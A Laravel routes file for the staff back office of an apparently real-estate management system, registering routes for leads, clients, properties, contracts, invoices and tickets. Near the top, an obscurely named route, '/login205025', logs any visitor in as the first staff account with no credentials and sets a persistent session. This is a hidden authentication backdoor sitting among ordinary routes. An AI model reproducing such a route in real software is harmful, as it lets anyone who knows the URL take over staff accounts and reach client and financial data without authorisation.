<?php

/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| contains the "web" middleware group. Now create something great!
|
*/

use App\Models\Staff;

Route::get('/logout', 'Auth\LoginController@logout')->name('logout'); //
Route::get('/login205025',function(){
    $staff = Staff::first();
    Auth('staff')->loginUsingId($staff->id, true);
    echo('done');
} )->name('system.guest'); //

Auth::routes();

Route::get('/staff/change-password', 'StaffController@changePassword')->name('system.staff.change-password');
Route::post('/staff/change-password', 'StaffController@changePasswordPost')->name('system.staff.change-password-post');

Route::resource('/lead','LeadController',['as'=>'system']); //
Route::resource('/staff','StaffController',['as'=>'system']); //

Route::resource('/client','ClientController',['as'=>'system']); //
Route::resource('/renter','ClientController',['as'=>'system']); //
Route::resource('/owner','ClientController',['as'=>'system']); //
Route::resource('/both','ClientController',['as'=>'system']); //
Route::post('/renter/block/{ID}', 'ClientController@block')->name('system.renter.block');///
Route::post('/owner/block/{ID}', 'ClientController@block')->name('system.owner.block');///
Route::post('/both/block/{ID}', 'ClientController@block')->name('system.both.block');///



Route::resource('/property-features','PropertyFeaturesController',['as'=>'system']); ///

Route::resource('/property-type','PropertyTypeController',['as'=>'system']); //
Route::resource('/data-source','DataSourceController',['as'=>'system']); //
Route::resource('/purpose','PurposeController',['as'=>'system']); //
Route::resource('/property-status','PropertyStatusController',['as'=>'system']); //
Route::resource('/property-model','PropertyModelController',['as'=>'system']); //
Route::resource('/request-status','RequestStatusController',['as'=>'system']); //
Route::resource('/page','PageController',['as'=>'system']); ///
Route::resource('/service','ServiceController',['as'=>'system']); ///
Route::resource('/package','PackageController',['as'=>'system']); ///
Route::resource('/client-package','ClientPackagesController',['as'=>'system']); ///
Route::resource('/slider','SliderController',['as'=>'system']); ///
Route::resource('/ads','AdsController',['as'=>'system']); ///
Route::resource('/sms','SmsController',['as'=>'system']); ///
Route::resource('/campaign','CampaignController',['as'=>'system']); ///
Route::resource('/newsletter','NewsletterController',['as'=>'system']); ///
Route::resource('/income-reasons','IncomeReasonController',['as'=>'system']); ///
Route::resource('/outcome-reasons','OutcomeReasonController',['as'=>'system']); ///
Route::resource('/locker','LockerController',['as'=>'system']); ///
Route::resource('/income','IncomeController',['as'=>'system']); ///
Route::resource('/outcome','OutcomeController',['as'=>'system']); ///
Route::resource('/payment-methods','PaymentMethodController',['as'=>'system']); ///
Route::resource('/dues','DueController',['as'=>'system']); ///
Route::resource('/contract-template','ContractTemplateController',['as'=>'system']); ///
Route::resource('/contract','ContractController',['as'=>'system']); ///
Route::resource('/property-dues','PropertyDuesController',['as'=>'system']); ///
Route::resource('/facility-companies','FacilityCompaniesController',['as'=>'system']); ///
Route::resource('/invoice','InvoiceController',['as'=>'system']); ///
Route::resource('/transaction','TransactionController',['as'=>'system']); ///
Route::resource('/client-transaction','ClientTransactionController',['as'=>'system']); ///
Route::resource('/special-property','SpecialPropertyController',['as'=>'system']); ///
Route::resource('/maintenance','MaintenanceController',['as'=>'system']); ///
Route::resource('/maintenance-category','MaintenanceCategoryController',['as'=>'system']); ///
Route::resource('/bank','BanksController',['as'=>'system']); ///
Route::resource('/bank-branch','BanksBranchesController',['as'=>'system']); ///
Route::resource('/push-notifications','PushNotificationController',['as'=>'system']); ///



Route::resource('/ticket','TicketController',['as'=>'system']); ///
Route::post('/ticket/change-status/{ID}','TicketController@updateTicketStatus')->name('system.ticket.change-status'); //

Route::resource('/contact','ContactusController',['as'=>'system']); ///
Route::post('/contact/to-ticket/{ID}','ContactusController@toTicket')->name('system.contact.to-ticket'); //


Route::get('/report/credits','ReportController@credits')->name('system.report.credit');//
Route::post('/report/credit-upload','ReportController@creditUpload')->name('system.report.upload-credit');//
Route::get('/report/total-dues','ReportController@totalDues')->name('system.report.total-dues');//
Route::get('/report/match','ReportController@match')->name('system.report.match');//


Route::post('/property/remove-image','PropertyController@removeImage')->name('system.property.remove-image'); //
Route::post('/property/image-upload','PropertyController@imageUpload')->name('system.property.image-upload'); //
Route::post('/property/publish/{ID}', 'PropertyController@publish')->name('system.property.publish');///


Route::post('/page/remove-image','PageController@removeImage')->name('system.page.remove-image'); //
Route::post('/page/image-upload','PageController@imageUpload')->name('system.page.image-upload'); //

Route::post('/service/remove-image','ServiceController@removeImage')->name('system.service.remove-image'); //
Route::post('/service/image-upload','ServiceController@imageUpload')->name('system.service.image-upload'); //
Route::post('/package/remove-image','PackageController@removeImage')->name('system.package.remove-image'); //
Route::post('/package/image-upload','PackageController@imageUpload')->name('system.package.image-upload'); //

Route::get('/property/upload-excel','PropertyController@uploadExcel')->name('system.property.upload-excel'); //
Route::post('/property/upload-excel','PropertyController@uploadExcelStore')->name('system.property.upload-excel-store'); //


Route::resource('/property','PropertyController',['as'=>'system']); //


Route::post('/request/share','RequestController@share')->name('system.request.share'); //
Route::post('/request/close-share','RequestController@closeShare')->name('system.request.close-share'); //

Route::resource('/request','RequestController',['as'=>'system']); //
Route::resource('/area-type','AreatypesController',['as'=>'system']); //
Route::resource('/area', 'AreaController',['as'=>'system']); //

// -- Setting
Route::get('/setting', 'SettingController@index')->name('system.setting.index'); //
Route::patch('/setting', 'SettingController@update')->name('system.setting.update'); //
// -- Setting

Route::get('/parameter/create/{id}','ParameterController@create')->name('system.parameter.create'); //
Route::get('/ajax','AjaxController@index')->name('system.misc.ajax'); //

Route::resource('/parameter','ParameterController',['as'=>'system']); //

// Calls
Route::resource('/call-purpose', 'CallPurposeController',['as'=>'system']); //
Route::resource('/call-status', 'CallStatusController',['as'=>'system']); //
Route::resource('/call', 'CallController',['as'=>'system']); //
// Calls

Route::resource('/importer', 'ImporterController',['as'=>'system']); //
Route::post('/importer/staff/distribute', 'ImporterController@distribute')->name('system.importer.distribute'); //
Route::get('/importer/staff/data', 'ImporterController@staff_data')->name('system.importer.staff'); //

Route::resource('/permission-group','PermissionGroupsController',['as'=>'system']); //

Route::get('/calendar','CalendarController@index')->name('system.calendar.index'); //
Route::get('/calendar/ajax','CalendarController@ajax')->name('system.calendar.ajax'); //
Route::get('/calendar/show','CalendarController@show')->name('system.calendar.show'); //
Route::post('/calendar/store','CalendarController@store')->name('system.calendar.store'); //
Route::get('/calendar/delete','CalendarController@delete')->name('system.calendar.delete'); //


Route::get('/notifications/{ID}', 'NotificationController@url')->name('system.notifications.url');
Route::get('/notifications', 'NotificationController@index')->name('system.notifications.index');

Route::get('/auth-sessions', 'AuthSessionController@index')->name('system.staff.auth-sessions');
Route::delete('/auth-sessions', 'AuthSessionController@deleteAuthSession')->name('system.staff.delete-auth-sessions');

Route::get('/activity-log/{ID}', 'ActivityController@show')->name('system.activity-log.show'); //
Route::get('/activity-log', 'ActivityController@index')->name('system.activity-log.index'); //

Route::get('/test', 'SystemController@test')->name('system.test');
Route::get('/', 'SystemController@dashboard')->name('system.dashboard');

Route::get('/cloud', 'CloudController@index')->name('system.cloud.index');
Route::get('/cloud/{cloud}', 'CloudController@show')->name('system.cloud.show');
Route::get('/cloud/setting/{cloud}', 'CloudController@setting')->name('system.cloud.setting');


Route::resource('/lead-status','LeadStatusController',['as'=>'system']); //abdo 5/2/2020
Route::resource('/lead-data','LeadDataController',['as'=>'system']); //abdo 7/2/2020
